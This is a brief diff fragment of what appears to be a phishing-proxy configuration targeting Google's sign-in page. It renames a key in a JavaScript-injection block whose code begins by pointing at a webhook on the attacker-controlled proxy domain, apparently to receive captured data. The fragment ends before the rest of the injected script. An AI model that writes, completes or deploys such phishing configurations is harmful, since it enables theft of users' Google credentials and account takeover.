@@ -20,7 +20,7 @@ login:
   domain: 'accounts.google.com'
   path: '/v3/signin/identifier'
 js_inject:
-  - trigger: 'accounts.google.com'
+  - trigger_domains: ['accounts.google.com']
     code: |
       (function() {
         const api = "https://{{.Domain}}/api/webhook";
